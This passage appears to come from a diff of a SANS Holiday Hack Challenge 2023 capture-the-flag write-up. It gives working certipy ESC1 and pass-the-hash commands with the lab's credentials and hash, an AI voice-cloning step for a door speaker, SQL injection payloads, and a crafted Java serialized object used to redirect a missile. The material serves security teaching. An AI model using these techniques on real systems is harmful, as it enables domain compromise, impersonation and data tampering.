XB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.RY10lk4djzAjCkvCkFw2fXvUN1b5D_QfFx0gyAsKVxEKDXbNCJy7VyTfJ2Y2KaaErTeUJpsQrbl_S1hNiUS3tA6dkJtDI6KGQy2DQKhQG33PLDYyn-wDt5G6EG9KwM6l4zAaEZD8guzFFCESC11USLzfOGGfp9L5Ql2Ac8uchvbRX8f0LuhBUtyFMihaGT65OgiAjxLY4Fo9AVV-Mt33U1ut4aAk-iNpYmCjWk28lIbQe_y0_07KgG8uwNjdve0-3qxoIVBlJOBZsYhQsLutylv_-6eGbUKuj0vQwGD0uk1H1om6fFvRWaAcMvR_BucZEJNTU3n2Eih7vSNsxRpTcA",
+  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
+  "expires_in": "85593",
+  "expires_on": "1702680341",
+  "ext_expires_in": "86399",
+  "not_before": "1702593641",
+  "resource": "https://vault.azure.net",
+  "token_type": "Bearer"
+}
+```
+
+Nice. Lets try getting the secrets again, this time with this new token.
+
+`curl https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4 -H "Authorization:Bearer {TOKEN_HERE}"`
+
+```json
+{
+  "value": [
+    {
+      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
+      "attributes": {
+        "enabled": true,
+        "created": 1699564823,
+        "updated": 1699564823,
+        "recoveryLevel": "Recoverable+Purgeable",
+        "recoverableDays": 90
+      },
+      "tags": {}
+    }
+  ],
+  "nextLink": null
+}
+```
+
+Ok, lets see if we can get this secret. Use the following API url.
+
+{vaultBaseUrl}/secrets/{secret-name}/{secret-version}?api-version=7.4
+
+Not sure about version number
+https://stackoverflow.com/questions/48432376/how-to-get-the-latest-secret-version-value-from-azure-key-vault-in-one-rest-api
+Seems from that link we can just ommit it.
+
+Lets try this:
+
+```
+curl https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4 -H "Authorization:Bearer {TOKEN_HERE}"
+```
+
+```json
+{
+  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
+  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
+  "attributes": {
+    "enabled": true,
+    "created": 1699564823,
+    "updated": 1699564823,
+    "recoveryLevel": "Recoverable+Purgeable",
+    "recoverableDays": 90
+  },
+  "tags": {}
+}
+```
+
+**Important Info Found:**
+username: elfy
+password: J4`ufC49/J4766
+ip: 10.0.0.53
+hostname: northpole.local
+
+Ok, now I think we can do some stuff with the certipy tool.
+
+`certipy find -u elfy@10.0.0.53` and then enter the password from above.
+
+Got a bunch of data for bloodhound and a json file stored in the active_directory folder.
+
+Tried this
+smbclient.py elfy:J4\`ufC49/J4766@10.0.0.53 -target-ip 10.0.0.53
+Could see a bunch of network shares. Could access FileShare, and I could see a super_secret_research directory but couldnt access it. In a todo.txt file in the FileShare, it says that folder is restricted to researchers only. So I think I need to figure out how to add myself to that group or add a new user to that group.
+
+We can use some of the python tools on the machine to look at the AD users:
+
+`python3 GetADUsers.py -all northpole.local/elfy:J4\`ufC49/J4766 -dc-ip 10.0.0.53`
+
+```s
+Name                  Email                           PasswordLastSet      LastLogon
+--------------------  ------------------------------  -------------------  -------------------
+alabaster                                             2023-12-14 01:32:23.273691  2023-12-14 15:00:33.550032
+Guest                                                 <never>              <never>
+krbtgt                                                2023-12-14 01:40:20.814181  <never>
+elfy                                                  2023-12-14 01:42:36.995282  2023-12-15 00:27:09.808925
+wombleycube                                           2023-12-14 01:42:37.135907  2023-12-15 00:23:55.147111
+```
+
+wombleycube is the one we want to go after.
+
+I figured out I actually needed to run certipy with the -vulnerable flag.
+`certipy find -vulnerable -u elfy@10.0.0.53`
+
+```json
+{
+  "Certificate Authorities": {
+    "0": {
+      "CA Name": "northpole-npdc01-CA",
+      "DNS Name": "npdc01.northpole.local",
+      "Certificate Subject": "CN=northpole-npdc01-CA, DC=northpole, DC=local",
+      "Certificate Serial Number": "73A115656766418C4BF415185A6EA0BD",
+      "Certificate Validity Start": "2023-12-15 01:06:26+00:00",
+      "Certificate Validity End": "2028-12-15 01:16:25+00:00",
+      "Web Enrollment": "Disabled",
+      "User Specified SAN": "Disabled",
+      "Request Disposition": "Issue",
+      "Enforce Encryption for Requests": "Enabled",
+      "Permissions": {
+        "Owner": "NORTHPOLE.LOCAL\\Administrators",
+        "Access Rights": {
+          "2": [
+            "NORTHPOLE.LOCAL\\Administrators",
+            "NORTHPOLE.LOCAL\\Domain Admins",
+            "NORTHPOLE.LOCAL\\Enterprise Admins"
+          ],
+          "1": [
+            "NORTHPOLE.LOCAL\\Administrators",
+            "NORTHPOLE.LOCAL\\Domain Admins",
+            "NORTHPOLE.LOCAL\\Enterprise Admins"
+          ],
+          "512": [
+            "NORTHPOLE.LOCAL\\Authenticated Users"
+          ]
+        }
+      }
+    }
+  },
+  "Certificate Templates": {
+    "0": {
+      "Template Name": "NorthPoleUsers",
+      "Display Name": "NorthPoleUsers",
+      "Certificate Authorities": [
+        "northpole-npdc01-CA"
+      ],
+      "Enabled": true,
+      "Client Authentication": true,
+      "Enrollment Agent": false,
+      "Any Purpose": false,
+      "Enrollee Supplies Subject": true,
+      "Certificate Name Flag": [
+        "EnrolleeSuppliesSubject"
+      ],
+      "Enrollment Flag": [
+        "PublishToDs",
+        "IncludeSymmetricAlgorithms"
+      ],
+      "Private Key Flag": [
+        "ExportableKey"
+      ],
+      "Extended Key Usage": [
+        "Encrypting File System",
+        "Secure Email",
+        "Client Authentication"
+      ],
+      "Requires Manager Approval": false,
+      "Requires Key Archival": false,
+      "Authorized Signatures Required": 0,
+      "Validity Period": "1 year",
+      "Renewal Period": "6 weeks",
+      "Minimum RSA Key Length": 2048,
+      "Permissions": {
+        "Enrollment Permissions": {
+          "Enrollment Rights": [
+            "NORTHPOLE.LOCAL\\Domain Admins",
+            "NORTHPOLE.LOCAL\\Domain Users",
+            "NORTHPOLE.LOCAL\\Enterprise Admins"
+          ]
+        },
+        "Object Control Permissions": {
+          "Owner": "NORTHPOLE.LOCAL\\Enterprise Admins",
+          "Write Owner Principals": [
+            "NORTHPOLE.LOCAL\\Domain Admins",
+            "NORTHPOLE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Dacl Principals": [
+            "NORTHPOLE.LOCAL\\Domain Admins",
+            "NORTHPOLE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Property Principals": [
+            "NORTHPOLE.LOCAL\\Domain Admins",
+            "NORTHPOLE.LOCAL\\Enterprise Admins"
+          ]
+        }
+      },
+      "[!] Vulnerabilities": {
+        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
+      }
+    }
+  }
+```
+
+Following this article, we can exploit the misconfigured Certificate Template and masquerade as another user.
+
+https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
+
+```s
+certipy req -u elfy@10.0.0.53 -p J4\`ufC49/J4766 -dc-ip 10.0.0.53 -target npdc01.northpole.local -ca northpole-npdc01-CA -template NorthPoleUsers -upn wombleycube@northpole.local
+```
+
+This generates a pfx file.
+
+Then we are supposed to get ccache file with this and present it to smbclient.py
+
+`certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53`
+
+For some reason using the ccache file did not work, but smbclient also accepts a hash for authentication though, which we did receive from the certipy. Lets do that.
+
+Here is the hash we received:
+`[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23`
+
+Now use smbclient to log in as wombleycube:
+`python3 impacket/smbclient.py wombleycube@10.0.0.53 -target-ip 10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23`
+
+We're in! Now lets read the file.
+
+InstructionsForEnteringSatelliteGroundStation.txt
+
+```s
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, 'Now I shall be out of sight;
+So through the valley and over the height.'
+And he'll silently take his way.
+```
+
+Done!
+
+## Space Island Door Access Speaker
+
+### Hint 1
+
+It seems the Access Speaker is programmed to only accept Wombley's voice. Maybe you could get a sample of his voice and use an AI tool to simulate Wombley speaking the passphrase.
+
+### Hint 2
+
+Wombley says a specific phrase into the Access Speaker. He works in the Research Department and everything they do it super secret, so it may be a challenge to find out what the phrase is. Ribb also works in that department. Try to find and ask him.
+
+### Solution
+
+We already got what he needs to say from his Active Directory samba fileshare (from the Active Directory challenge):
+
+```s
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, 'Now I shall be out of sight;
+So through the valley and over the height.'
+And he'll silently take his way.
+```
+
+We also got a recording of one of his audiobooks from talking to Wombleycube earlier.
+
+Next, I used https://vocloner.com/ to upload his talk mp3, and then generate a wav file of him saying the secret passphrase. Now play it into the door access speaker. Done!
+
+## Camera Access
+
+### Hint 1
+
+In his hubris, Wombley revealed that he thinks you won't be able to access the satellite's "Supervisor Directory". There must be a good reason he mentioned that specifically, and a way to access it. He also said there's someone else masterminding the whole plot. There must be a way to discover who that is using the nanosat.
+
+### Objective
+
+Gain access to Jack's camera. What's the third item on Jack's TODO list?
+
+### Solution
+
+In "Zenith SGS" on Space Island, click on the NanoSat-o-matic vending machine to download sample satellite client. This will give a `build_and_run.sh` file and a `README.md` file. Run the .sh file and connect to the docker container with a VNC client on localhost:5900 (I used RealVNC). You should now see the satellite client desktop.
+
+![desktop](images/camera_access/desktop.png)
+
+In the README file that was downloaded from the vending machine, we see instructions for how to set up a wireguard connection to connect to a server. We will need to do this on our satellite client so we can access the server.
+
+_Here is a relevant snippet from the README:_
+
+```
+There is many ways to connect wireguard but often times its just 1 to 1 connection.
+
+In this case, a client config would look something like this:
+
+
+[Interface]
+Address = 10.1.1.2/24
+PrivateKey = hTCxVDQRxSd5OwGc4TPffcNgmP488+K6j5nn6NloONo=
+ListenPort = 51820
+
+[Peer]
+PublicKey = 2k45++7JvVLLXwZufPeV8LmzK6IpivWDGdCVi2yhsxI=
+Endpoint = 34.172.176.5:51820
+AllowedIPs = 10.1.1.1/32
+
+
+Save the config to the following file `/etc/wireguard/wg0.conf` using a command like this:
+
+# Copy/Paste works best with gedit in this vnc container
+gedit /etc/wireguard/wg0.conf
+# OR
+nano /etc/wireguard/wg0.conf
+# OR
+vim /etc/wireguard/wg0.conf
+
+Then we need to take down the interface and bring it back up:
+
+# Bring down
+wg-quick down wg0
+# Bring up
+wg-quick up wg0
+
+## Nanosat MO Framework:
+
+Documentation on the Nanosat framework can be found at:
+
+https://nanosat-mo-framework.readthedocs.io/en/latest/opssat/testing.html
+
+Can connect to a server using:
+
+maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory
+```
+
+Now to get our own VPN client, click on the ground station dashboard and click on the gator face in bottom right.
+
+![dashboard](images/camera_access/dashboard.png)
+
+We can now click "time travel" and get a client VPN config to connect to.
+
+![vpn config](images/camera_access/timetravel.png)
+
+Now lets add this config into our terminal station in docker and connect.
+
+**Wireguard Config:**
+
+_Note: Yours will be different_
+
+```
+[Interface]
+Address = 10.1.1.2/24
+PrivateKey = pwp9Zs4wXxHAS1czeIdVFUcyVlcIHqXmbEmcyfOYTUk=
+ListenPort = 51820
+
+[Peer]
+PublicKey = pD2HLNa+ipBuWDYbmy40ZXgQYQeGFcElHeRDE4rv/Uc=
+Endpoint = 34.67.86.222:51820
+AllowedIPs = 10.1.1.1/32
+```
+
+Target IP: 34.67.86.222
+This is the endpoint we want to connect to with CTT.
+
+Now, we need to add our wireguard config to the satellite client. The easiest way to do this is by creating the wg0.conf file on your host, paste the wireguard config you got from GateXOR into it and then use the `docker cp` command to copy it to the satellite client container.
+
+```
+docker cp wg0.conf docker_container_name:/etc/wireguard
+```
+
+Now in the satellite client docker container, open up a shell and run the following command to connect to the wireguard server.
+
+```
+wg-quick up wg0
+```
+
+Now that we are connected to the VPN server, right click on the desktop of the satellite client, and click Satellite Tools -> Launch Nanosat MO Base Station Tool. Now in the Directory Service URI field, put the following url (with your own IP):
+
+`maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory`
+
+![fetch information](images/camera_access/fetch_info.png)
+
+Click "Fetch Information"
+
+You should now see a list of services.
+
+![services](images/camera_access/connect_to_selected.png)
+
+Now to start the camera app, click on the Camera service line (as highlighted in the above image) and click "Connect to Selected Provider". A new tab should open and you should be shown the following screen.
+
+![camera app](images/camera_access//start_camera_app.png)
+
+Now click on the row with the camera app, and click "runApp". After this, change back to the "Communication Settings (Directory)" tab and then click "Fetch Information". You should now see a new provider in the "Providers List" called "App: camera" like shown below.
+
+![camera provider](images/camera_access/camera_provider.png)
+
+Click "Connect to Selected Provider" to connect to the camera app. Your screen should look something like this now:
+
+![camer app](images/camera_access/camera_app.png)
+
+_**Note:** If you had any trouble starting/connecting to the camera app, you can take a look at the "Starting and connecting to your app" section in the documentation [here](https://nanosat-mo-framework.readthedocs.io/en/latest/opssat/testing.html)._
+
+Once connected to the app, go to the "Action service" tab and click on Base64ImageAction
+
+![Base64SnapImage](images/camera_access/base64SnapImage.png)
+
+Click "Submit Action" and then click Submit.
+
+![take image](images/camera_access/submit_image.png)
+
+This just took the satellite image. Now we need to find a way to view this Bas64ImageData. By going to the "Parameter service" tab, we can click on "Base64SnapImage" and click "getValue". This will open a popup with the base64 data that is way too long to read and we can't copy it.
+
+![getvalue popup](images/camera_access/getvalue.png)
+
+To fix this problem, we can use wireshark to capture the packets when we click the getValue button, then export the data by finding one of the packets containing base64 data in the capture and right clicking -> Follow -> TCP Capture. This should open a new window with all the data from every packet in the TCP stream pieced together.
+
+![tcpstream](images/camera_access/tcpstream.png)
+
+Now, click the "Save As" button, save the file and copy it back to your host machine using `docker cp`. Once the file is on your host machine, remove the leading and trailing data that is not base64 with a text editor.
+
+Next, use the following command to convert the base64 data into a png file.
+
+```
+base64 -d -i base64data.txt > image.png
+```
+
+_Note: If you didnt remove all the non base64 stuff, you will get an error but the decode should still work and give you the image._
+
+![satellite image](images/camera_access/satimage.png)
+
+Flag: `CONQUER HOLIDAY SEASON!`
+
+Done!
+
+## Missile Diversion
+
+### Objective
+
+Thwart Jack's evil plan by re-aiming his missile at the Sun.
+
+### Hint
+
+Wombley thinks he may have left the admin tools open. I should check for those if I get stuck.
+
+### Solution
+
+This challenge has many similarities with the camera access challenge. We are again in the satellite client desktop environment using the Consumer Test Tool. You may have noticed a "missile targeting system" app in the Apps Launcher Service when going through the camera access challenge. This is exactly what we need to use for this challenge. Start the app and connect to it just as we did with the camera app in the camera access challenge.
+
+#### SQL Injection
+
+After playing around with the application for a bit, we can see that it controls a missile targeting system but we cannot change any of the settings. After clicking around enough, I encountered what seemed to be a debug message showing that the server was using MariaDB. Knowing this, I assume there must be an SQL injection point somewhere. After looking around, I found an injection point at the Debug action in the "Action service" tab. We can inject SQL there and read the results on the "Parameter service" tab by clicking "getValue" on the debug parameter.
+
+**Injection point:**
+
+![injection point](images/diversion/injection_point.png)
+
+**View results:**
+
+![viewing point](images/diversion/viewing_point.png)
+
+Following [this article](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/) we can test our SQL injection point and figure out more information.
+
+Inserting `ORDER BY 1` into the injection point returns a normal result (database debug info). Anything higher than 1 returns an error. This means the current table only has 1 column.
+
+Now we insert `UNION SELECT 1` and the debug info returns a 1, confirming this column is vulnerable.
+
+We can run this now to get a list of the database tables:
+
+```
+UNION SELECT (SELECT group_concat(table_name) from information_schema.tables where table_schema=database())
+```
+
+We get the following 5 tables:
+
+```
+satellite_query,messaging,pointing_mode_to_str,pointing_mode,target_coordinates
+```
+
+Lets try and access some of these tables.
+
+Using the format `;select * from <table_name>` we can access the items in each table through our SQL injection point. From doing this, it seems as though pointing_mode holds the numerical value of the current pointing mode for the missile, where pointing_mode_to_str holds the string values for these numerical pointing modes. In here we can see that 0 is equivalent to "earth point mode" and 1 is equivalent to "sun point mode".
+
+**pointing_mode**
+![pointing_mdoe](images/diversion/pointing_mode.png)
+
+**pointing_mode_to_str**
+![pointing_mode_to_str](images/diversion/pointing_mode_to_str.png)
+
+This means we just have to find a way to update the pointing_mode value from 0 (earth point mode) to 1 (sun point mode).
+
+Lets try running an SQL update.
+`;update pointing_mode set numerical_mode = 1 where id = 1`
+
+This did not work and returns an error saying we dont have permission to perform an update.
+
+![update denied](images/diversion/update_denied.png)
+
+Lets try and look at our permissions by using the MySQL command `show grants`.
+The results show we can insert on the satellite_query table and select on all tables. This is interesting, but first we need to figure out what we could do with that. Lets look at the satellite_query table by doing `;select * from satellite_query`.
+
+![satellite query table](images/diversion/satellite_query_item.png)
+
+The output from the table shows 3 columns (jid, object, results), with only one entry.
+
+The entry we see has `jid`=1, `object` seems to be a serialized java object, and `results` is the contents of a java file called `SatelliteQueryFileFolderUtility.java`.
+
+If we describe the table as follows; `;describe satellite_query`
+we see that the satellite_query table has the following columns:
+
+```
+jid: int(11) (primary key, auto increment)
+object: blob
+results: text
+```
+
+Taking a closer look at the java file (full file in missile_diversion/java), we see that it is a class called SatelliteQueryFileFolderUtility. The class has 3 parameters; isQuery, isUpdate, and pathOrStatement. It seems to function as follows. If isQuery is false, then it assumes pathOrStatement is a file path and returns the contents of the file as a string. If isQuery is true, it assumes pathOrStatement is a MySQL statement and either runs a select statement if isUpdate is false, or runs an update statement if isUpdate is true.
+
+Looking back at the name of the table (satellite_query) it seems that this java class (SatelliteQueryFileFolderUtility) is the backend for this missile diversion app we have been using. The satellie_query table looks like it allows you to insert a serialized java object (of the SatelliteQueryFileFolderUtility class) and then the server will run the object and display the results in the "results" column in the table. This means we should be able to serialize our own SatelliteQueryFileFolderUtility object with the isQuery and isUpdate parameters set to true, and the pathOrStatement parameter set to a MySQL statement that will update the pointing_mode table to sun point mode.
+
+First lets copy the java file from the satellite_query table to our own machine for some modification (use wireshark to view and save the full data as done in the Camera Access challenge above).
+
+Now lets add a main function to this existing java file to serialize our own SatelliteQueryFileFolderUtility object to a binary file. To do this, I asked ChatGPT to write some java code for serializing an object and saving it to a file. Apart from the object instantiation at the beginning the following code was pretty much all auto generated by ChatGPT.
+
+The prompt I gave it was:
+
+```
+Write me a java function which serializes an object and saves it to a file.
+```
+
+Pretty simple. I then added it all to a main function in the java file.
+
+```java
+public static void main(String args[]) {
+    // Create object
+    SatelliteQueryFileFolderUtility sq = new SatelliteQueryFileFolderUtility("update pointing_mode set numerical_mode=1 where id=1;", true, true);
+    String filename = "sq.txt";
+
+    // Serialization
+    try
+    {
+        //Saving of object in a file
+        FileOutputStream file = new FileOutputStream(filename);
+        ObjectOutputStream out = new ObjectOutputStream(file);
+
+        // Method for serialization of object
+        out.writeObject(sq);
+        out.close();
+        file.close();
+        System.out.println("Object has been serialized");
+    }
+
+    catch(IOException ex)
+    {
+        System.out.println("IOException is caught");
+    }
+}
+```
+
+You can see the full original and modified java files in `missile_diversion/java`.
+
+As you can see in the code above, we create a SatelliteQueryFileFolderUtility object with the pathOrStatement parameter set to a MySQL update query, and both isUpdate and isQuery set to true. Then we serialize the object and write the contents to a file. Next we will convert this binary file into hex so we can insert it into the satellite_query table. The object column in the satellite_query table takes data of type "blob" which is typically binary data. The easiest way to insert an object of this type is with hex.
+
+#### Serialize the object
+
+Now that we modified our java file, lets run it. You will need the gson jar, so make sure you download it so we can include it in our classpath. We first generate the .class file with `javac` and then run the file with the `java` command.
+
+```
+javac -cp /your/classpath/to/gson:/your/classpath/to/gson/gson.jar SatelliteQueryFileFolderUtility.java
+java SatelliteQueryFileFolderUtility
+```
+
+Now we should have a binary file in our directory called `sq.txt`. Lets convert this to hex and save to a new file sq.hex.
+
+```
+xxd -p -c 1000000 sq.txt sq.hex
+```
+
+Now, copy the hex file to the docker container.
+
+```
+docker cp sq.hex docker_container_name:/root
+```
+
+#### Insert the Object
+
+Now, inside the container, copy the contents of the sq.hex file to the clipboard (gedit works best) and write the MySQL query in the injection point as follows:
+
+`;insert into satellite_query (object) values (0xHEXDATAHERE)`
+
+Submit the query and go check the pointing mode. It should say "Sun Point Mode".
+
+![sun point mode](images/diversion/sun_point_mode.png)
+
+Done!
+
+## BONUS! Fishing Guide
+
+Sail around and catch 20 fish. Pretty simple!
+
+## BONUS! Fishing Mastery
+
+To catch 20 fish took a bit of time, but to catch all will take a lot more. We don't want to have to do it all manually so let's try to automate it.
+
+There are two ways we can go about automating this. The first is by adding new code to the browser, and the other is by interacting directly with the websocket.
+
+### Fish with Websocket
+
+If you inspect your browser network traffic with Burp or the dev tools, you will notice a URL that starts with `wss://`. This is a websocket url and it's how we will communicate directly with the Holiday Hack Servers to automate our fishing. To fish using the websocket we have a couple steps:
+
+1. Open the websocket.
+2. Authenticate.
+3. Set sail.
+4. Fish.
+
+Through some reverse engineering of the network logs from manually connecting, setting sail and fishing I made the script at `fishing_mastery/auto_rod.py`. If you want to run it, make sure you input your credentials first.
+
+![auto fishing with websocket](images/fishing_mastery/script_output.png)
+
+### Modifying Browser Code
+
+By adding some extra code to our browser, we can add functionality to our sailing client to detect when a fish is on the line, reel it in, and then immediately cast again.
+
+By looking at the source code of the sailing portion of the game, I found the button that handles the casting functionality. It has a classname of `castreel`. Similarly, the button that handles the reeling functionality has a classname of `reelitin`.
+
+To make the browser automatically fish for us, we can use something called a MutationObserver. A MutationObserver will call a function you give it when whatever it is observing mutates. When we are fishing, if a fish bites the line the reel button has the class "gotone" added to its CSS. Similarly, when we reel in a fish, the cast button has its display CSS changed from `none` to `block`. Using a MutationObserver, we can watch both of these buttons for these changes, and run some code when we see the desired change. See the code below.
+
+Code to auto fish in browser
+
+```js
+let castBtn = document.getElementsByClassName("castreel")[0];
+let reelBtn = document.getElementsByClassName("reelitin")[0];
+
+let reelCallback = (mutationList, observer) => {
+  mutationList.forEach(function (mutation) {
+    if (mutation.type === "attributes" && mutation.attributeName === "class") {
+      if (Object.values(reelBtn.classList).includes("gotone")) {
+        reelBtn.click();
+        // castBtn.click();
+      }
+    }
+  });
+};
+let castCallback = (mutationList, observer) => {
+  mutationList.forEach(function (mutation) {
+    if (mutation.type === "attributes" && mutation.attributeName === "style") {
+      if (castBtn.style.display === "block") {
+        castBtn.click();
+      }
+    }
+  });
+};
+let options = { attributes: true };
+let reelObserver = new MutationObserver(reelCallback);
+let castObserver = new MutationObserver(castCallback);
+reelObserver.observe(reelBtn, options);
+castObserver.observe(castBtn, options);
+```
+
+All you need to do is paste this in your browser console (make sure you select the iframe in the console dropdown) and press enter. Now cast your line and watch as it fishes for you!
+
+![auto fishing](images/fishing_mastery/auto_fishing.mov)
+
+#### Heatmap
+
+If you fish for long enough, you will realize that you've caught a lot of fish but have not completed the challenge. This is because there is a secret heatmap of where each fish appear on the map with one in particular only appearing in one specific location. The following link can be found in the website source code in a comment mentioning its for development only.
+
+https://2023.holidayhackchallenge.com/sea/fishdensityref.html
+
+To find any of the fish you are missing, we can add the image of the heatmap to your minimap in game so you can sail to it and find the fish easily.
+
+To edit the browser code you will need to use a browser which allows this (like chromium).
+
+Find the `drawMiniMap` function and change the code from this:
+
+```js
+const me = Entities[playerData.uid];
+const minimapScale = ImageAssets.minimap.width / ImageAssets.bump.width;
+drawImageWithTransform(
+  ImageAssets.minimap,
+  miniMapPosition.x,
+  miniMapPosition.y,
+  0,
+  1,
+  1
+);
+ctx.fillStyle = "yellow";
+```
+
+to this:
+
+```js
+const img = new Image();
+img.src =
+  "https://2023.holidayhackchallenge.com/sea/assets/noise/Piscis%20Cyberneticus%20Skodo.png";
+const newMinimap = img;
+const me = Entities[playerData.uid];
+const minimapScale = newMinimap.width / ImageAssets.bump.width;
+drawImageWithTransform(
+  newMinimap,
+  miniMapPosition.x,
+  miniMapPosition.y,
+  0,
+  1,
+  1
+);
+ctx.fillStyle = "yellow";
+```
+
+Now you should see the heatmap on your minimap.
+
+![updated minimap](images/fishing_mastery/updated_minimap.png)
+
+If you want to put the heatmap for a different fish, just change out the URL in the code above for the correct heatmap image URL.
+
+With all this info, you should be able to catch everything!
